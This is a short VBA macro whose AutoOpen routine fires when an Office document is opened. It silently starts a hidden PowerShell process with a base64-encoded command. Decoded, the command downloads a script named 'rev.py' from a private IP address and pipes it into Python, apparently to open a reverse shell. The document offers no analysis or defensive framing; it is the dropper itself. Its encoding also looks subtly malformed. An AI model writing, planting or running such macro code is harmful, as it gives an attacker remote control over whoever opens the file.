Sub AutoOpen()
    Dim b64 As String
    b64 = "KFN5bS5OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzEwLjAuMC4xL3Jldi5weScpIHwgcHl0aG9uIC0="
    Shell "powershell -NoProfile -WindowStyle Hidden -EncodedCommand " & b64, vbHide
End Sub